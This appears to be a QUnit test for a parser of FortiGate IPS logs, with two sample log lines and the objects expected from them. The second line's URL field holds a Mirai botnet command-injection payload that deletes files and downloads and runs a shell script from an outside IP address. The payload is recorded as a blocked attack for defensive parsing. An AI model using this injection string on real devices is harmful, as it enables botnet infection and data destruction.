const { parseFgtIpsLog } = require('../../../wwwroot/scripts/atk_batchpost.js');

QUnit.module('atk_batchpost.js');

QUnit.test('parseFgtIpsLog', function (assert) {
    const log = `date=2024-01-17 time=16:51:41 logid="1" type="utm" subtype="ips" eventtype="signature" level="alert" vd="root" eventtime=1705477902827283177 tz="+0900" severity="critical" srcip=2.58.95.35 srccountry="Reserved" dstip=10.0.0.1 srcintf="wan2" srcintfrole="wan" dstintf="routingNet1" dstintfrole="lan" sessionid=1 action="dropped" proto=6 service="HTTP" policyid=5 attack="D-Link.Devices.HNAP.SOAPAction-Header.Command.Execution" srcport=59966 dstport=80 hostname="180.4.99.156" url="/HNAP1/" direction="outgoing" attackid=40772 profile="high_security" ref="http://www.fortinet.com/ids/VID40772" incidentserialno=630382407 msg="web_app3: D-Link.Devices.HNAP.SOAPAction-Header.Command.Execution," crscore=50 craction=4096 crlevel="critical"
date=2024-01-17 time=16:05:27 logid="2" type="utm" subtype="ips" eventtype="signature" level="alert" vd="root" eventtime=1705475127828125017 tz="+0900" severity="high" srcip=185.224.128.191 srccountry="Netherlands" dstip=10.0.0.1 srcintf="wan2" srcintfrole="wan" dstintf="routingNet1" dstintfrole="lan" sessionid=2 action="dropped" proto=6 service="HTTP" policyid=5 attack="Mirai.Botnet" srcport=47474 dstport=80 hostname="180.4.99.156" url="/cgi-bin/mft/wireless_mft?ap=testname;rm -rf *; cd /tmp; busybox wget http://104.168.5.4/abus.sh; chmod 777 abus.sh; sh abus.sh" direction="outgoing" attackid=43191 profile="high_security" ref="http://www.fortinet.com/ids/VID43191" incidentserialno=630379196 msg="backdoor: Mirai.Botnet," crscore=30 craction=8192 crlevel="high"`;

    const expected = [
        {
            src: '2.58.95.35',
            srcPort: '59966',
            dst: '10.0.0.1',
            dstPort: '80',
            msg: 'FortiGate IPS Signature: D-Link.Devices.HNAP.SOAPAction-Header.Command.Execution',
            epoch: 1705477902,
        },
        {
            src: '185.224.128.191',
            srcPort: '47474',
            dst: '10.0.0.1',
            dstPort: '80',
            msg: 'FortiGate IPS Signature: Mirai.Botnet',
            epoch: 1705475127,
        }
    ];

    const actual = parseFgtIpsLog(log);
    assert.deepEqual(actual, expected);
});